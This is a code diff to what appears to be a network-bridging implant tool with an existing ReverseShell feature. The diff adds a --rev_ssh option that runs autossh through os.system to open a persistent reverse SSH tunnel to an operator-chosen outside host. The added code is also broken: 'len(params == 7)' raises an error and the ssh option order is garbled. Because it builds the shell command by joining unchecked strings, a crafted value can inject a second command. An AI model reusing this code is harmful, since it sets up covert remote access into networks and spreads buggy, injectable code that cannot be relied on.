@@ -561,6 +561,19 @@ def main():
     if args.rev_host:
         shell = ReverseShell(args.rev_host, args.rev_password, args.rev_sleep)
 
+    if args.rev_ssh:
+        params = args.rev_ssh.split(":")
+        if len(params == 7):
+            username = params[0]
+            host = params[1]
+            port = params[2]
+            privkey = params[3]
+            remote_port = params[4]
+            remote_host = params[5]
+            local_port = params[6]
+            os.system('autossh -p '+port+' -M 0 -f -N -o -i '+privkey+' "ServerAliveInterval 60" -o "ServerAliveCountMax 3" -R'+remote_port+':'+remote_host+':'+local_port+' '+username+'@'+host)
+        else:
+            print "[-] Error - incorrectly specified rev_ssh options, will not establish tunnel..."
     bridge.up()
     decoder = DecoderThread(bridge, subnet, arptable)
 
@@ -648,6 +661,7 @@ if __name__ == '__main__':
                         default=['eth1', 'eth2'],
                         help='Unordered list of two interfaces. If not set '
                              'the default "eth1 eth2" is used.')
+    parser.add_argument('-s','--rev_ssh',default=None,metavar="<USERNAME>:<HOST>:<PORT>:<PATH_TO_PRIV_KEY>:<REMOTE_FWD_PORT>:<REMOTE_FWD_HOST>:<LOCAL_FWD_PORT>",help='Use autossh to establish a reverse portfwd.')
     args = parser.parse_args()
 
     for iface in args.ifaces:
